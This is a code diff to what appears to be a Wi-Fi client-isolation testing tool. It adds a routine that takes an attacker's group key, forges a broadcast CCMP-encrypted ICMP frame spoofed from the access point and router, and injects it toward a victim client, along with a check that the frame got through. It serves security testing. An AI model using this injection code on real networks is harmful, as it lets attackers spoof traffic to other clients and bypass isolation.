@@ -8,6 +8,7 @@ from libwifi import *
 import abc, sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select, threading
 from datetime import datetime
 from wpaspy import Ctrl
+from libwifi.crypto import encrypt_ccmp
 
 #### Debug output functions ####
 
@@ -202,6 +203,11 @@ class Monitor(Daemon):
 		if p and self.is_target_frame(p):  # Check packet size
 			log(STATUS, f"Captured large frame: {len(p)} bytes", color="green")
 			p.show()
+
+	def inject_mon(self, p):
+		if p is None or not p.haslayer(Dot11):
+			log(WARNING, "Injecting frame on monitor iface without Dot11-layer.")
+		self.sock_mon.send(p)
 
 
 
@@ -772,6 +778,8 @@ class Client2Client:
 		elif b"forward_ethernet" in raw(eth):
 			self.forward_ethernet = True
 			log(STATUS, f">>> Client to client traffic at Ethernet layer is allowed ({identities}).", color="red")
+		elif b"icmp_ping_test" in raw(eth):
+			log(STATUS, f">>> GTK wrapping ICMP ping is allowed ({identities}).", color="red")
 		elif ARP in eth and eth[ARP].op == 2 and \
 			eth[ARP].psrc == self.sup_victim.routerip and eth[ARP].pdst == self.sup_victim.clientip and \
 			eth[ARP].hwdst == self.sup_victim.mac and eth[ARP].hwsrc == self.sup_attacker.mac:
@@ -839,6 +847,41 @@ class Client2Client:
 				time.sleep(0.1)
 			log(STATUS, f"Finished sending 1000 uplink stealing frames.")
 
+		elif self.options.c2c_gtk_inject is not None:
+			victim_gtk_2 = self.sup_victim.get_gtk_2()
+			attacker_gtk_2 = self.sup_attacker.get_gtk_2()
+			log(STATUS, f">>> The victim's GTK is ({victim_gtk_2}).", color="green")
+			log(STATUS, f">>> The attacker's GTK is ({attacker_gtk_2}).", color="green")
+			self.mon_attacker = Monitor(self.options.c2c_gtk_inject, self.options)
+			self.mon_attacker.start()
+
+			gtk, idx, seq = attacker_gtk_2.split()
+			gtk = bytes.fromhex(gtk)
+			idx = int(idx)
+			seq = int(seq, 16)
+			
+			sn = 10
+
+			header = Dot11(type="Data", subtype=0, SC=(sn << 4) | 0)
+			# if qos is True:
+			if True:
+				header[Dot11].subtype = 8
+				header.add_payload(Dot11QoS())
+			sn += 1
+			header.FCfield |= 'from-DS' # From AP.
+			header.addr1 = "ff:ff:ff:ff:ff:ff"
+			header.addr2 = self.sup_attacker.bssid_victim
+			header.addr3 = "ff:ff:ff:ff:ff:ff"
+			header.FCfield = "from-DS"
+
+			header.TID = 2
+			seq += 50
+			frame = header/LLC()/SNAP()/IP(src=self.sup_victim.routerip, dst=self.sup_victim.clientip)/ICMP()/Raw(b"icmp_ping_test")
+			frame = encrypt_ccmp(frame, gtk, seq, keyid=idx)
+			log(STATUS, "Injecting frame 5 times: " + repr(frame))
+			# Inject multiple times because broadcast frames don't get acked/retransmitted
+			for i in range(5):
+				self.mon_attacker.inject_mon(frame)
 
 		else:
 			# Note: there are different forms of ARP poisoning. We only test for the basic variant,
@@ -936,12 +979,7 @@ class Client2Client:
 			log(STATUS, f">>> The victim's GTK is ({victim_gtk}).", color="green")
 			log(STATUS, f">>> The attacker's GTK is ({attacker_gtk}).", color="green")
 			return
-		if self.options.c2c_gtk_inject is not None:
-			victim_gtk_2 = self.sup_victim.get_gtk_2()
-			attacker_gtk_2 = self.sup_attacker.get_gtk_2()
-			log(STATUS, f">>> The victim's GTK is ({victim_gtk_2}).", color="green")
-			log(STATUS, f">>> The attacker's GTK is ({attacker_gtk_2}).", color="green")
-			return
+		
 
 		# [ Send a packet from the attacker to the victim ]
 
